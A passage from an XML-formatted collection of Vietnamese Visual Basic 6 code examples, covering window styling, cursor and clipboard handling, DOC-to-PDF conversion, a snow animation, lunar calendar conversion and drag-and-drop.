 '"c:\..\..\mydocuments" --&gt; c:\mydocuments = Ðoc lùi cho Ðên folder chi Ðinh
 '"c:\\\" --&gt; c:\ = lùi câp cao nhât "region1" --&gt; c:\mydocuments\reports\region1 = Ðoc to'i thêm câp
 '"c:*.*\may97" --&gt; c:\mydocuments\reports\*.*\may97 = Ðoc to'i cho Ðên folder chi Ðinh
    
 'Ðoc thu muc cha
    MsgBox fso.GetParentFolderName("C:\windows\system")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080818100820</MaVD>
    <NoiDung>Ví dụ form 1 có 3 Textbox, thuộc tính text là "TEST", khi sử dụng ta dùng code sau:
Private Sub Command1_Click()
    TextBoxMod Form1, [Clear All Textbox's], "TEST2"
End Sub
Dòng code trên sẽ chuyển thuộc tính text của cả 3 textbox thành "TEST2"

Copy đoạn code sau vào 1 module
Public Enum What2Clear
    [Clear All Textbox's] = 0
    [Clear Textbox's Contained In Frames] = 1
    [Clear Textbox's Contained In Picturebox's] = 2
    [Clear Textbox's Contained In Form] = 3
End Enum
 
Public Sub TextBoxMod(WhichForm As Form, CommandLine As What2Clear, Optional ReplaceWith As String = Empty)
 Dim Control As Control
 
    For Each Control In WhichForm 'tìm trong form được chỉ định
 
 
        If CommandLine = [Clear All Textbox's] Then
            If TypeOf Control Is TextBox Then Control.Text = ReplaceWith
            'tìm trong tất cả các textbox
        ElseIf CommandLine = [Clear Textbox's Contained In Form] Then
            'chỉ tìm trong các textbox trên form
            If TypeOf Control Is TextBox And TypeOf Control.Container Is Form Then Control.Text = ReplaceWith
        ElseIf CommandLine = [Clear Textbox's Contained In Frames] Then
            'chỉ tìm các textbox trong frame
            If TypeOf Control Is TextBox And TypeOf Control.Container Is Frame Then Control.Text = ReplaceWith
        ElseIf CommandLine = [Clear Textbox's Contained In Picturebox's] Then
            'chỉ tìm các textbox trong picturebox
            '     
            If TypeOf Control Is TextBox And TypeOf Control.Container Is PictureBox Then Control.Text = ReplaceWith
        End If
 
    Next
 
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081218101232</MaVD>
    <NoiDung>Option Explicit
 
Private Type FLASHWINFO
cbSize As Long
Hwnd As Long
dwFlags As Long
uCount As Long
dwTimeout As Long
End Type
 
Private Const FLASHW_TRAY = 2
Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
Private Declare Function FlashWindowEx Lib "user32" (FWInfo As FLASHWINFO) As Boolean
 
Public Sub FlashWindow(Hwnd As Long, Optional NumberOfFlashes As Integer = 10)
If Not APIFunctionPresent("FlashWindowEx", "user32") Then Exit Sub
Dim bRet As Boolean
Dim udtFWInfo As FLASHWINFO
With udtFWInfo
.cbSize = 20
.Hwnd = Hwnd
.dwFlags = FLASHW_TRAY
.uCount = NumberOfFlashes
.dwTimeout = 0
End With
bRet = FlashWindowEx(udtFWInfo)
End Sub
 
Private Function APIFunctionPresent(ByVal FunctionName As String, ByVal DllName As String) As Boolean
Dim lHandle As Long
Dim lAddr As Long
lHandle = LoadLibrary(DllName)
If lHandle &lt;&gt; 0 Then
lAddr = GetProcAddress(lHandle, FunctionName)
FreeLibrary lHandle
End If
APIFunctionPresent = (lAddr &lt;&gt; 0)
End Function
 
Private Sub Form_Load()
FlashWindow Me.Hwnd
End Sub </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082818102840</MaVD>
    <NoiDung>Private Sub Form_Load()
    Form1.Height = 6400
    Form1.Width = 10000
End Sub
Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        coolCloseForm Me, 20
    Else
        Dim a As New Form1
        a.Height = a.Height / 2
        a.Width = a.Width / 2
        a.Show
    End If
End Sub
 
Public Function coolCloseForm(closeForm As Form, speed As Integer)
 
    If speed = 0 Then
        MsgBox "Speed cannot zero"
        Exit Function
    End If
 
    On Error Resume Next
        closeForm.ScaleMode = 1
        closeForm.WindowState = 0
        Do Until closeForm.Height &lt;= 405
            DoEvents
                closeForm.Height = closeForm.Height - speed * 10
                closeForm.Top = closeForm.Top + speed * 5
            Loop
            Do Until closeForm.Width &lt;= 1680
                DoEvents
                    closeForm.Width = closeForm.Width - speed * 10
                    closeForm.Left = closeForm.Left + speed * 5
                Loop
                Unload closeForm
End Function

Sử dụng : Chạy ứng dụng sau đó Click chuột Trái, click chuột phải để thấy kết quả </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083018103054</MaVD>
    <NoiDung>Thêm vào Form 2 command button:

Private Declare Function GetWindowLong Lib "User32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "User32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Sub SetWindowPos Lib "User32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long)
 
Private Const GWL_STYLE = (-16)
 
Private Const SWP_FRAMECHANGED = &amp;H20
Private Const SWP_NOMOVE = &amp;H2
Private Const SWP_NOSIZE = &amp;H1
Private Const SWP_NOZORDER = &amp;H4
 
Private Const WS_BORDER = &amp;H800000
Private Const WS_CAPTION = &amp;HC00000
Private Const WS_MAXIMIZEBOX = &amp;H10000
Private Const WS_MINIMIZEBOX = &amp;H20000
Private Const WS_THICKFRAME = &amp;H40000
 
Private Sub Command1_Click()
    'Sizable = No
    Dim lPrevStyle As Long
    lPrevStyle = GetWindowLong(Form1.hWnd, GWL_STYLE)
    Call SetWindowLong(Form1.hWnd, GWL_STYLE, (lPrevStyle And (Not WS_THICKFRAME) And (Not WS_BORDER) And (Not WS_CAPTION) And (Not WS_MINIMIZEBOX) And (Not WS_MAXIMIZEBOX)))
    Call SetWindowPos(Form1.hWnd, 0, 0, 0, 0, 0, SWP_FRAMECHANGED Or SWP_NOMOVE Or SWP_NOSIZE Or SWP_NOZORDER)
End Sub
 
Private Sub Command2_Click()
    'Sizable = Yes
    Dim lPrevStyle As Long
    lPrevStyle = GetWindowLong(Form1.hWnd, GWL_STYLE)
    Call SetWindowLong(Form1.hWnd, GWL_STYLE, (lPrevStyle Or WS_THICKFRAME Or WS_BORDER Or WS_CAPTION Or WS_MINIMIZEBOX Or WS_MAXIMIZEBOX))
    Call SetWindowPos(Form1.hWnd, 0, 0, 0, 0, 0, SWP_FRAMECHANGED Or SWP_NOMOVE Or SWP_NOSIZE Or SWP_NOZORDER)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083618103626</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim Temp As New Collection, i As Integer, NN As Integer
    For i = 1 To (10) + 1 'Tao gia tri ban dau
        Temp.Add (i)
    Next
For i = 0 To (10) - 1  'Tao so ngau nhien
    Randomize
    NN = Fix(Rnd(1) * (Temp.Count - 1)) + 1
    List1.AddItem Temp(NN)
    Temp.Remove (NN)
Next
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083818103801</MaVD>
    <NoiDung>Private Declare Function ShowCursor Lib "user32" _
        (ByVal bShow As Long) As Long
 
Dim ShowMouse As Boolean
 
Private Sub Form_Click()
    ShowMouse = Not ShowMouse
    ShowCursor ShowMouse
End Sub
 
Private Sub Form_Load()
    ShowMouse = True
End Sub
 
Private Sub Form_QueryUnload(Cancel As Integer, _
        UnloadMode As Integer)
    If Not ShowMouse Then
        ShowCursor True
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084018104022</MaVD>
    <NoiDung>Copy đoạn code sau vào Module :
Option Explicit
 
Private Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type
 
Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
 
Private Const SRCCOPY = &amp;HCC0020 ' (DWORD) dest = source
 
Declare Function CreateCompatibleDC Lib "gdi32" (ByVal hDC As Long) As Long
 
Declare Function CreateCompatibleBitmap Lib "gdi32" (ByVal hDC As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
 
Declare Function SelectObject Lib "gdi32" (ByVal hDC As Long, ByVal hObject As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
 
Private Declare Function OpenClipboard Lib "USER32" (ByVal hWnd As Long) As Long
Private Declare Function CloseClipboard Lib "USER32" () As Long
Private Declare Function SetClipboardData Lib "USER32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Private Declare Function EmptyClipboard Lib "USER32" () As Long
Private Const CF_BITMAP = 2
 
Public Function CopyEntirePicture(ByRef objFrom As Object) As Boolean
    Dim lhDC As Long
    Dim lhBMP As Long
    Dim lhBMPOld As Long
    lhDC = CreateCompatibleDC(objFrom.hDC)
    If (lhDC &lt;&gt; 0) Then
        lhBMP = CreateCompatibleBitmap(objFrom.hDC, objFrom.ScaleWidth \ Screen.TwipsPerPixelX, objFrom.ScaleHeight \ Screen.TwipsPerPixelY)
        If (lhBMP &lt;&gt; 0) Then
            lhBMPOld = SelectObject(lhDC, lhBMP)
            BitBlt lhDC, 0, 0, objFrom.ScaleWidth \ Screen.TwipsPerPixelX, objFrom.ScaleHeight \ Screen.TwipsPerPixelY, objFrom.hDC, 0, 0, SRCCOPY
            SelectObject lhDC, lhBMPOld
            EmptyClipboard
            OpenClipboard 0
            SetClipboardData CF_BITMAP, lhBMP
            CloseClipboard
        End If
        DeleteObject lhDC
    End If
End Function
Sử dụng nó :
CopyEntirePicture Picture1 'Picture1 là tên picturebox muốn đưa vào clipboard</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084218104255</MaVD>
    <NoiDung>Option Explicit
 
Function DOC2PDF(sDocFile, sPDFFile)
On Error GoTo err:
Dim FSO
Dim objWord
Dim objWordDoc
Dim objWordDocs
Dim sPrevPrinter  As String
Dim objDistiller
Dim sTempFile, sFolder
 
Set objDistiller = CreateObject("PDFDistiller.PDFDistiller")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set objWord = CreateObject("Word.Application")
Set objWordDocs = objWord.Documents
 
sTempFile = App.Path &amp; "\Temp"
sDocFile = FSO.GetAbsolutePathName(sDocFile)
sFolder = FSO.GetParentFolderName(sDocFile)
 
If Len(sPDFFile) = 0 Then
  sPDFFile = FSO.GetBaseName(sDocFile) + ".pdf"
End If
 
If Len(FSO.GetParentFolderName(sPDFFile)) = 0 Then
  sPDFFile = sFolder + "\" + sPDFFile
End If
 
sPrevPrinter = objWord.ActivePrinter
 
objWord.ActivePrinter = "Acrobat Distiller"
 
Set objWordDoc = objWordDocs.Open(sDocFile)
 
objWord.ActiveDocument.PrintOut False, , , sTempFile
objWordDoc.Close
objWord.ActivePrinter = sPrevPrinter
objWord.Quit
Set objWord = Nothing
 
objDistiller.FileToPDF sTempFile, sPDFFile, "Print"
Set objDistiller = Nothing
FSO.DeleteFile (sTempFile)
 
Set FSO = Nothing
 
MsgBox "PDF File Created", vbInformation
Exit Function
 
err:
MsgBox err.Description, vbExclamation
End Function

Cách dùng:
DOC2PDF "Path của File doc cần chuyển", "Path của File pdf xuất ra"</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084418104412</MaVD>
    <NoiDung>Option Explicit
Private Declare Function CreateDCAsNull Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, lpDeviceName As Any, lpOutput As Any, lpInitData As Any) As Long
Private Declare Function DeleteDC Lib "gdi32" (ByVal hdc As Long) As Long
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function DrawText Lib "user32" Alias "DrawTextA" (ByVal hdc As Long, ByVal lpStr As String, ByVal nCount As Long, lpRect As RECT, ByVal wFormat As Long) As Long
Private Declare Function GetTextColor Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function SetTextColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Public Sub TestDesktopDC()
    Dim hdc As Long
    Dim tR As RECT
    Dim lCol As Long
    hdc = CreateDCAsNull("DISPLAY", ByVal 0&amp;, ByVal 0&amp;, ByVal 0&amp;)
    tR.Left = 0
    tR.Top = 0
    tR.Right = 640
    tR.Bottom = 32
    lCol = GetTextColor(hdc)
    SetTextColor hdc, &amp;HFF&amp;
    DrawText hdc, "Cau Lac Bo Visual Basic", Len("Cau Lac Bo Visual Basic"), tR, 0
    SetTextColor hdc, lCol
    DeleteDC hdc
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084518104543</MaVD>
    <NoiDung>Tạo Form1 có 1 label tên Label1. Chép code dưới vào form. Chuột sẽ hiện hình bàn tay khi ta di chuyển chuột trên Label1.

Option Explicit
 
Private Declare Function LoadCursor Lib "user32.dll" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As Long) As Long
Private Declare Function SetCursor Lib "user32.dll" (ByVal hCursor As Long) As Long
 
Const IDC_HAND As Long = &amp;H7F89
Dim hCursor As Long
 
Private Sub Form_Load()
    Label1.BorderStyle = 1
    hCursor = LoadCursor(ByVal 0&amp;, IDC_HAND)
End Sub
 
Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    SetCursor hCursor
End Sub
 
Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    SetCursor hCursor
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084718104700</MaVD>
    <NoiDung>Option Base 1
 
Dim arr(5) As String
 
Private Sub Form_Load()
    arr(1) = "cau"
    arr(2) = "lac"
    arr(3) = "bo"
    arr(4) = "vb"
    arr(5) = ".com"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>01</MaVD>
    <NoiDung>Option Explicit
' you should keep the original copyright:
' Copyright (C) 2003 Free Code
' http://www.emu8086.com/vb/
Dim i As Integer
Private Type xParticle 'Truong Vinh Phuoc suu tâm
    X As Integer
    Y As Integer
    oldX As Integer
    oldY As Integer
    iStopped As Integer
End Type
Private Const MAXP = 400
Private Snow(0 To MAXP) As xParticle

Private Sub Form_Load()
Me.AutoRedraw = True
Timer1.Enabled = True
Timer1.Interval = 100
Randomize
 With Me
    .AutoRedraw = True
    .FontSize = 24
    .FontBold = True
    .ScaleMode = 3 'Pixel
    .DrawWidth = 1 'only 1
    .BackColor = vbBlack

        For i = 0 To MAXP ' The RND formula!
        Snow(i).X = Int(.ScaleWidth * Rnd)
        Snow(i).Y = Int(.ScaleHeight * Rnd)
        Next i

    ' Center and draw the text:
    Const sTEXT = "  e m u 8 0 8 6 . c o m" &amp; vbCrLf &amp; "  c a u l a c b o v b . c o m"
    .ForeColor = vbYellow
    .CurrentX = .ScaleWidth / 2 - TextWidth(sTEXT) / 2
    .CurrentY = .ScaleHeight / 2 - TextHeight(sTEXT) / 2 - 5
    Print sTEXT
    .ForeColor = vbWhite
 End With
End Sub

Sub DrawSnow()
Dim newX As Integer, newY As Integer
 Do While Timer1.Enabled

    For i = 0 To MAXP
       Me.PSet (Snow(i).oldX, Snow(i).oldY), vbBlack
       Me.PSet (Snow(i).X, Snow(i).Y)

       Snow(i).oldX = Snow(i).X
       Snow(i).oldY = Snow(i).Y

      ' A trick to get both positive and negative random values:
       newX = Snow(i).X + Int(2 * Rnd) - Int(2 * Rnd)

      ' Don't alow our snow to run away:
       If newX &lt; 0 Then newX = 0
       If newX &gt;= Me.ScaleWidth Then newX = Me.ScaleWidth - 1
       newY = Snow(i).Y + 1

            If Me.Point(newX, newY) = vbBlack Then
                Snow(i).Y = newY
                Snow(i).X = newX
            Else
                If Snow(i).iStopped = 10 Then ' if stopped 10 times, make new!
                    newParticle (i)
                Else
                    Snow(i).iStopped = Snow(i).iStopped + 1
                End If
            End If
       If (Snow(i).Y) &gt;= Me.ScaleHeight Then newParticle (i)
    Next i
    DoEvents
Loop

End Sub

Sub newParticle(i As Integer)
    Snow(i).X = Int(Me.ScaleWidth * Rnd)
    Snow(i).Y = 0
    Snow(i).oldX = 0
    Snow(i).oldY = 0
    Snow(i).iStopped = 0
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub Timer1_Timer()
    DrawSnow
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000217</MaVD>
    <NoiDung>Public Lday, Lmonth As Byte, Lyear As Integer, isLeap, LunarInfo 
Sub LNI() 
LunarInfo = Array( _ 
&amp;H3C4BD8, &amp;H624AE0, &amp;H4CA570, &amp;H3854D5, &amp;H5CD260, &amp;H44D950, &amp;H315554, &amp;H5656A0, &amp;H409AD0, &amp;H2A55D2, &amp;H504AE0, &amp;H3AA5B6, &amp;H60A4D0, &amp;H48D250, &amp;H33D255, &amp;H58B540, &amp;H42D6A0, &amp;H2CADA2, &amp;H5295B0, &amp;H3F4977, _ 
&amp;H644970, &amp;H4CA4B0, &amp;H36B4B5, &amp;H5C6A50, &amp;H466D40, &amp;H2FAB54, &amp;H562B60, &amp;H409570, &amp;H2C52F2, &amp;H504970, &amp;H3A6566, &amp;H5ED4A0, &amp;H48EA50, &amp;H336A95, &amp;H585AD0, &amp;H442B60, &amp;H2F86E3, &amp;H5292E0, &amp;H3DC8D7, &amp;H62C950, _ 
&amp;H4CD4A0, &amp;H35D8A6, &amp;H5AB550, &amp;H4656A0, &amp;H31A5B4, &amp;H5625D0, &amp;H4092D0, &amp;H2AD2B2, &amp;H50A950, &amp;H38B557, &amp;H5E6CA0, &amp;H48B550, &amp;H355355, &amp;H584DA0, &amp;H42A5B0, &amp;H2F4573, &amp;H5452B0, &amp;H3CA9A8, &amp;H60E950, &amp;H4C6AA0, _ 
&amp;H36AEA6, &amp;H5AAB50, &amp;H464B60, &amp;H30AAE4, &amp;H56A570, &amp;H405260, &amp;H28F263, &amp;H4ED940, &amp;H38DB47, &amp;H5CD6A0, &amp;H4896D0, &amp;H344DD5, &amp;H5A4AD0, &amp;H42A4D0, &amp;H2CD4B4, &amp;H52B250, &amp;H3CD558, &amp;H60B540, &amp;H4AB5A0, &amp;H3755A6, _ 
&amp;H5C95B0, &amp;H4649B0, &amp;H30A974, &amp;H56A4B0, &amp;H40AA50, &amp;H29AA52, &amp;H4E6D20, &amp;H39AD47, &amp;H5EAB60, &amp;H489370, &amp;H344AF5, &amp;H5A4970, &amp;H4464B0, &amp;H2C74A3, &amp;H50EA50, &amp;H3D6A58, &amp;H6256A0, &amp;H4AAAD0, &amp;H3696D5, &amp;H5C92E0, _ 
&amp;H46C960, &amp;H2ED954, &amp;H54D4A0, &amp;H3EDA50, &amp;H2A7552, &amp;H4E56A0, &amp;H38A7A7, &amp;H5EA5D0, &amp;H4A92B0, &amp;H32AAB5, &amp;H58A950, &amp;H42B4A0, &amp;H2CBAA4, &amp;H50AD50, &amp;H3C55D9, &amp;H624BA0, &amp;H4CA5B0, &amp;H375176, &amp;H5C5270, &amp;H466930, _ 
&amp;H307934, &amp;H546AA0, &amp;H3EAD50, &amp;H2A5B52, &amp;H504B60, &amp;H38A6E6, &amp;H5EA4E0, &amp;H48D260, &amp;H32EA65, &amp;H56D520, &amp;H40DAA0, &amp;H2D56A3, &amp;H5256D0, &amp;H3C4AFB, &amp;H6249D0, &amp;H4CA4D0, &amp;H37D0B6, &amp;H5AB250, &amp;H44B520, &amp;H2EDD25, _ 
&amp;H54B5A0, &amp;H3E55D0, &amp;H2A55B2, &amp;H5049B0, &amp;H3AA577, &amp;H5EA4B0, &amp;H48AA50, &amp;H33B255, &amp;H586D20, &amp;H40AD60, &amp;H2D4B63, &amp;H525370, &amp;H3E49E8, &amp;H60C970, &amp;H4C54B0, &amp;H3768A6, &amp;H5ADA50, &amp;H445AA0, &amp;H2FA6A4, &amp;H54AAD0, _ 
&amp;H4052E0, &amp;H28D2E3, &amp;H4EC950, &amp;H38D557, &amp;H5ED4A0, &amp;H46D950, &amp;H325D55, &amp;H5856A0, &amp;H42A6D0, &amp;H2C55D4, &amp;H5252B0, &amp;H3CA9B8, &amp;H62A930, &amp;H4AB490, &amp;H34B6A6, &amp;H5AAD50, &amp;H4655A0, &amp;H2EAB64, &amp;H54A570, &amp;H4052B0, _ 
&amp;H2AB173, &amp;H4E6930, &amp;H386B37, &amp;H5E6AA0, &amp;H48AD50, &amp;H332AD5, &amp;H582B60, &amp;H42A570, &amp;H2E52E4, &amp;H50D160, &amp;H3AE958, &amp;H60D520, &amp;H4ADA90, &amp;H355AA6, &amp;H5A56D0, &amp;H462AE0, &amp;H30A9D4, &amp;H54A2D0, &amp;H3ED150, &amp;H28E952, _ 
&amp;H4EB520, &amp;H38D727, &amp;H5EADA0, &amp;H4A55B0, &amp;H362DB5, &amp;H5A45B0, &amp;H44A2B0, &amp;H2EB2B4, &amp;H54A950, &amp;H3CB559, &amp;H626B20, &amp;H4CAD50, &amp;H385766, &amp;H5C5370, &amp;H484570, &amp;H326574, &amp;H5852B0, &amp;H406950, &amp;H2A7953, &amp;H505AA0, _ 
&amp;H3BAAA7, &amp;H5EA6D0, &amp;H4A4AE0, &amp;H35A2E5, &amp;H5AA550, &amp;H42D2A0, &amp;H2DE2A4, &amp;H52D550, &amp;H3E5ABB, &amp;H6256A0, &amp;H4C96D0, &amp;H3949B6, &amp;H5E4AB0, &amp;H46A8D0, &amp;H30D4B5, &amp;H56B290, &amp;H40B550, &amp;H2A6D52, &amp;H504DA0, &amp;H3B9567, _ 
&amp;H609570, &amp;H4A49B0, &amp;H34A975, &amp;H5A64B0, &amp;H446A90, &amp;H2CBA94, &amp;H526B50, &amp;H3E2B60, &amp;H28AB61, &amp;H4C9570, &amp;H384AE6, &amp;H5CD160, &amp;H46E4A0, &amp;H2EED25, &amp;H54DA90, &amp;H405B50, &amp;H2C36D3, &amp;H502AE0, &amp;H3A93D7, &amp;H6092D0, _ 
&amp;H4AC950, &amp;H32D556, &amp;H58B4A0, &amp;H42B690, &amp;H2E5D94, &amp;H5255B0, &amp;H3E25FA, &amp;H6425B0, &amp;H4E92B0, &amp;H36AAB6, &amp;H5C6950, &amp;H4674A0, &amp;H31B2A5, &amp;H54AD50, &amp;H4055A0, &amp;H2AAB73, &amp;H522570, &amp;H3A5377, &amp;H6052B0, &amp;H4A6950, _ 
&amp;H346D56, &amp;H585AA0, &amp;H42AB50, &amp;H2E56D4, &amp;H544AE0, &amp;H3CA570, &amp;H2864D2, &amp;H4CD260, &amp;H36EAA6, &amp;H5AD550, &amp;H465AA0, &amp;H30ADA5, &amp;H5695D0, &amp;H404AD0, &amp;H2AA9B3, &amp;H50A4D0, &amp;H3AD2B7, &amp;H5EB250, &amp;H48B540, &amp;H33D556) '' /* Years 2100-2199 */ 
End Sub 
Sub lunar(d, m, y) 
Dim DiffADate, Counter, I, Temp 

DiffADate = DateDiff("d", #1/31/1900#, CDate(d &amp; "-" &amp; m &amp; "-" &amp; y)) 

Counter = -1 
Lyear = 1900 

For I = Lyear To 2199 
Temp = YearDays(I) 
Counter = Counter + Temp 
If Counter &gt;= DiffADate Then 
Counter = Counter - Temp 
Exit For 
End If 
Lyear = Lyear + 1 
Next 

Leap = LeapMonth(Lyear) 
isLeap = " 
Lmonth = 1 

For I = 1 To 12 
If Leap &gt; 0 And I = Leap + 1 And isLeap = " Then 
isLeap = "(N)" 
Lmonth = Lmonth - 1 
I = I - 1 
Temp = LeapDay(Lyear) 
Else 
Temp = MonthDays(Lyear, I) 
End If 

If isLeap = "(N)" And I &lt;&gt; Leap Then isLeap = " 

Counter = Counter + Temp 

If Counter &gt;= DiffADate Then 
Counter = Counter - Temp 
Exit For 
End If 
Lmonth = Lmonth + 1 
Next 
Lday = DiffADate - Counter 
End Sub 
Function LeapMonth(y) 
LNI 
If y &gt;= 1900 Then LeapMonth = LunarInfo(y - 1900) And &amp;HF Else LeapMonth = 0 
End Function 
'----------- 
Function LeapDay(y) 
LNI 
If LunarInfo(y - 1900) And &amp;HF Then 
If LunarInfo(y - 1900) And &amp;H10000 Then LeapDay = 30 Else LeapDay = 29 
Else 
LeapDay = 0 
End If 
End Function 
'----------- 
Function MonthDays(y, m) 
LNI 
MonthMask = Array(32768, 16384, 8192, 4096, 2048, 1024, 512, 256, 128, 64, 32, 16) 
If LunarInfo(y - 1900) And MonthMask(m - 1) Then MonthDays = 30 Else MonthDays = 29 
End Function 
'----------- 
Function YearDays(y) 
Dim I 
LNI 
MonthMask = Array(32768, 16384, 8192, 4096, 2048, 1024, 512, 256, 128, 64, 32, 16) 
YearDays = 348 
For I = 0 To 11 
If LunarInfo(y - 1900) And MonthMask(I) Then YearDays = YearDays + 1 
Next 
YearDays = YearDays + LeapDay(y) 
End Function 
'Ham so chuyen doi tu Duong lich sang Am lich dang ngay,thang,nam 
Public Function TransLu(d, m, y) 
Call lunar(m, d, y) 
TransLu = Lday &amp; "/" &amp; Lmonth &amp; isLeap &amp; "/" &amp; Lyear 
End Function 
'Ham so chuyen doi tu Duong lich sang Am lich dang tu mot o 
Public Function TransLu1(NT As Date) 
Call lunar(Day(NT), Month(NT), Year(NT)) 
TransLu1 = Lday &amp; "-" &amp; Lmonth &amp; isLeap &amp; "-" &amp; CanchiV(Lyear - 0) 
End Function 

Public Function TransSolar(d, m, y) As Date 'Ngay thang nam am lich sang duong lich 
Dim iSd As Date 
iSd = DateSerial(y, m, d) - 70 
Do 
iSd = iSd + 1 
Loop Until TransLu(Day(iSd), Month(iSd), Year(iSd)) = d &amp; "/" &amp; m &amp; "/" &amp; y 
TransSolar = iSd 
End Function 

'======================================= 
'Cach su dung: 
'======================================= 
Private Sub Command1_Click() 
    MsgBox "Ngay DL: 22/1/2006" &amp; vbCrLf &amp; "Ngay AL: " &amp; TransLu(22, 1, 2006) 
End Sub
Tham khảo thêm:
module xem giờ, ngày,tháng, năm âm lịch của TrungDung1977
Module toàn diện về Âm lịch của vie87vn</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084119094149</MaVD>
    <NoiDung>Hàm tách dòng: Hàm tách dòng trả về 1 đối tượng kiểu Collection (cách sử dụng đối tượng này giống y như listbox)
Function TachDong(mStr As String) As Collection
Dim cLt As New Collection
Dim pos As Integer
Dim mLine As String
mStr = mStr + vbNewLine
pos = InStr(mStr, Chr(13))
Do While pos &lt;&gt; 0
    mLine = Left(mStr, pos - 1)
    cLt.Add mLine
    mStr = Right(mStr, Len(mStr) - pos - 1)
    pos = InStr(mStr, Chr(13))
Loop
Set TachDong = cLt
End Function
Cách dùng:
Private Sub Command1_Click()
Dim cL As New Collection 'Tạo một đối tượng Collection
Set cL = TachDong(Text1.Text) 'Gán đối tượng này bằng đối tượng trả về của TachDong
 
Dim I As Integer
Dim nmLine
 
For I = 1 To cL.Count 'Duyệt tất cả các item của cL
nmLine = CStr(cL.Item(I)) 
List1.AddItem nmLine 'add mỗi dòng trong cL vào listBox
Next
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080619100604</MaVD>
    <NoiDung>1- Chỉ tìm tên ngày âm lịch từ 1/4/1800 về sau. (nếu muốn trước đó nữa, bạn thay ngày trong hàm sao cho phù hợp)
2- Ngày tháng theo cấu trúc "m/d/yyyy"


Private Function NgayAmLich(ByVal Data As Date) As String
Dim Can() As String, Chi() As String
Can = Split("Canh,Tân,Nhâm,Qúy,Giáp,Ât,Bính,Ðinh,Mâu,Ky", ",")
Chi = Split("Thân,Dâu,Tuât,Ho'i,Tý,Suu,Dân,Mao,Thìn,Ty,Ngo,Mùi", ",")
NgayAmLich = Can(DateDiff("d", #4/1/1800#, Data) Mod 10) &amp; " " &amp; Chi(DateDiff("d", #4/1/1800#, Data) Mod 12)
End Function
 
Private Sub Form_Load()  '"m/d/yyyy"
MsgBox NgayAmLich(#3/20/2008#)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081319101316</MaVD>
    <NoiDung>- Tạo 1 Module và thêm vào đoạn code sau : 
Option Explicit
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Const SND_SYNC = &amp;H0
Const SND_ASYNC = &amp;H1
Const SND_NODEFAULT = &amp;H2
Const SND_LOOP = &amp;H8
Const SND_NOSTOP = &amp;H10
- Thêm vào Form 1 button có tên Command1.
- Thêm vào đoạn coce sau :
Private Sub Command1_Click()
    Dim sFlags As Long
    sFlags = SND_ASYNC Or SND_NODEFAULT
    sndPlaySound "SystemStart", sFlags
End Sub

Xem:
Play Wav.rar </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081819101858</MaVD>
    <NoiDung>Private Sub Form_Load()
Me.OLEDropMode = 1
MsgBox "Thu nho cua so VB6 lai, ra Explorer rôi keo 1 thu gi do cung ok tu Explorer vao form"
End Sub
Private Sub Form_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, x As Single, y As Single)
Dim filefolder As String
Dim fname As Variant
    For Each fname In Data.Files
        filefolder = filefolder &amp; fname &amp; vbCrLf
    Next fname
    MsgBox " Ha ha ta biet roi, ban muon toi dung " &amp; filefolder &amp; " chu gi, Con khuya nha, toi cha them dau"
    Effect = vbDropEffectNone
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082319102328</MaVD>
    <NoiDung>Option Explicit
'If you want to exclude hyphans you could add '!-' to this constant
